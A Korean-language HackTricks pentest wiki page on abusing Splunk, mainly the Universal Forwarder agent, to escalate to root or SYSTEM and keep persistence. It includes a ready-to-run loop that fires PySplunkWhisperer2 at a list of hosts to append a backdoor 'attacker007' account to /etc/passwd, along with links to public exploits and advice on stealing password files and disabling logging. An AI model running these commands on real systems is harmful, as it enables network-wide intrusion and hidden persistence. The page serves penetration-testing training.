# Splunk LPE 및 지속성

{{#include ../../banners/hacktricks-training.md}}

기계 **내부** 또는 **외부**를 **열거**하는 동안 **Splunk가 실행 중**인 것을 발견하면(포트 8090), 운이 좋게도 **유효한 자격 증명**을 알고 있다면 **Splunk 서비스를 악용**하여 Splunk를 실행 중인 사용자로서 **쉘을 실행**할 수 있습니다. 만약 root가 실행 중이라면, root 권한으로 상승할 수 있습니다.

또한 이미 **root**이고 Splunk 서비스가 localhost에서만 수신 대기하지 않는 경우, Splunk 서비스에서 **비밀번호** 파일을 **훔치고** 비밀번호를 **크랙**하거나 **새로운** 자격 증명을 추가할 수 있습니다. 그리고 호스트에서 지속성을 유지할 수 있습니다.

아래 첫 번째 이미지에서 Splunkd 웹 페이지가 어떻게 생겼는지 볼 수 있습니다.

## Splunk Universal Forwarder Agent 취약점 요약

자세한 내용은 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) 포스트를 확인하세요. 이것은 요약입니다:

**취약점 개요:**
Splunk Universal Forwarder Agent (UF)를 대상으로 하는 취약점은 공격자가 에이전트 비밀번호를 사용하여 에이전트를 실행 중인 시스템에서 임의의 코드를 실행할 수 있게 하여 전체 네트워크를 위험에 빠뜨릴 수 있습니다.

**주요 사항:**

- UF 에이전트는 수신 연결이나 코드의 진위를 검증하지 않아 무단 코드 실행에 취약합니다.
- 일반적인 비밀번호 획득 방법에는 네트워크 디렉토리, 파일 공유 또는 내부 문서에서 찾는 것이 포함됩니다.
- 성공적인 취약점 악용은 손상된 호스트에서 SYSTEM 또는 root 수준의 접근, 데이터 유출 및 추가 네트워크 침투로 이어질 수 있습니다.

**취약점 실행:**

1. 공격자가 UF 에이전트 비밀번호를 획득합니다.
2. Splunk API를 사용하여 에이전트에 명령이나 스크립트를 전송합니다.
3. 가능한 작업에는 파일 추출, 사용자 계정 조작 및 시스템 손상이 포함됩니다.

**영향:**

- 각 호스트에서 SYSTEM/root 수준 권한으로 전체 네트워크가 손상됩니다.
- 탐지를 피하기 위해 로깅을 비활성화할 가능성.
- 백도어 또는 랜섬웨어 설치.

**취약점 악용을 위한 예제 명령:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**사용 가능한 공개 익스플로잇:**

- https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
- https://www.exploit-db.com/exploits/46238
- https://www.exploit-db.com/exploits/46487

## Splunk 쿼리 악용

**자세한 내용은 게시물 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)를 확인하세요.**

{{#include ../../banners/hacktricks-training.md}}
